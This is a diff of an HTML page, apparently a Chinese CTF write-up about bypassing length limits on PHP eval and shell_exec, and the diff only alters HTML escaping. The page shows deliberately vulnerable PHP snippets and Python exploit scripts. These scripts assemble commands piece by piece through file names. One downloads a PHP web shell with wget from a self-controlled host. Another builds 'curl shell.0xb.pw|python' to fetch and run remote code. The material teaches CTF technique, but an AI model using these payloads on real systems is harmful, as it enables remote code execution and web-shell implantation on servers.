@@ -526,20 +526,20 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
         <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
-<span class="token delimiter">?&gt;</span>
+<span class="token delimiter">?></span>
 </code></pre>
 <p>很简单，长度不能大于等于17，直接在eval里面再用一个eval就可以了。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120211733-bf383cdc-1cb5-1.png" alt="image.png"></p>
 <h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
-<span class="token delimiter">?&gt;</span>
+<span class="token delimiter">?></span>
 </code></pre>
 <p>这里要用到我们前面所讲到的重定向，<code>n &gt; file</code>：将文件描述符为 n 的文件重定向到 file。<br>既然我们不能一次执行一条完整的命令，我们可以分为多次<br>举个简单的例子</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120221721-1a28f340-1cbe-1.png" alt="image.png"></p>
 <p>ls是默认以文件名排序的，所以我们为了控制我们命令的顺序，可以使用ls -t按时间逆序。<br>不过这里考虑到直接写shell有点麻烦（因为php中的一些符号用到shell中是有意义的，要各种转义，为了节省代码量我们直接用curl或者是wget从服务器dump一个shell下来）<br>exp如下：</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-name<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"&gt;php\\"</span><span class="token punctuation">,</span><span class="token string">"&gt;\\ 1.\\\\"</span><span class="token punctuation">,</span><span class="token string">"&gt;\\ -O\\\\"</span><span class="token punctuation">,</span><span class="token string">"&gt;cn\\\\"</span><span class="token punctuation">,</span><span class="token string">"&gt;\\ a.\\\\"</span><span class="token punctuation">,</span><span class="token string">"&gt;wget\\\\"</span><span class="token punctuation">]</span>
+name<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">">php\\"</span><span class="token punctuation">,</span><span class="token string">">\\ 1.\\\\"</span><span class="token punctuation">,</span><span class="token string">">\\ -O\\\\"</span><span class="token punctuation">,</span><span class="token string">">cn\\\\"</span><span class="token punctuation">,</span><span class="token string">">\\ a.\\\\"</span><span class="token punctuation">,</span><span class="token string">">wget\\\\"</span><span class="token punctuation">]</span>
 <span class="token comment" spellcheck="true">#可以修改hosts文件，让a.cn指向一个自己的服务器。</span>
 <span class="token comment" spellcheck="true">#index.html是一个php的shell</span>
 url<span class="token operator">=</span><span class="token string">"http://192.168.163.128/test.php"</span>
@@ -547,7 +547,7 @@ url<span class="token operator">=</span><span class="token string">"http://192.1
     <span class="token keyword">print</span> x
     param<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span>x<span class="token punctuation">}</span>
     a<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param<span class="token punctuation">)</span>
-param1<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'ls -t&gt;a'</span><span class="token punctuation">}</span>
+param1<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'ls -t>a'</span><span class="token punctuation">}</span>
 param2<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'sh a'</span><span class="token punctuation">}</span>
 requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param1<span class="token punctuation">)</span>
 requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param2<span class="token punctuation">)</span>
@@ -576,28 +576,28 @@ b<span class="token operator">=</span>requests<span class="token punctuation">.<
 <span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
 <span class="token keyword">from</span> urllib <span class="token keyword">import</span> quote
 payload <span class="token operator">=</span> <span class="token punctuation">[</span>
-   <span class="token comment" spellcheck="true"># generate `ls -t&gt;g` file</span>
-   <span class="token string">'&gt;ls\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'ls&gt;_'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;\ \\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;-t\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;\&gt;g'</span><span class="token punctuation">,</span>
-   <span class="token string">'ls&gt;&gt;_'</span><span class="token punctuation">,</span>
-   <span class="token comment" spellcheck="true"># generate `curl orange.tw.tw&gt;python`</span>
+   <span class="token comment" spellcheck="true"># generate `ls -t>g` file</span>
+   <span class="token string">'>ls\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'ls>_'</span><span class="token punctuation">,</span>
+   <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>-t\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>\>g'</span><span class="token punctuation">,</span>
+   <span class="token string">'ls>>_'</span><span class="token punctuation">,</span>
+   <span class="token comment" spellcheck="true"># generate `curl orange.tw.tw>python`</span>
    <span class="token comment" spellcheck="true"># curl shell.0xb.pw|python</span>
-   <span class="token string">'&gt;on'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;th\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;py\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;\|\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;pw\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;x.\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;xx\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;l.\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;el\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;sh\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;\ \\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;rl\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;cu\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>on'</span><span class="token punctuation">,</span>
+   <span class="token string">'>th\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>py\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>\|\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>pw\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>x.\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>xx\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>l.\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>el\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>sh\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>rl\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>cu\\'</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true"># exec</span>
    <span class="token string">'sh _'</span><span class="token punctuation">,</span>
    <span class="token string">'sh g'</span><span class="token punctuation">,</span>
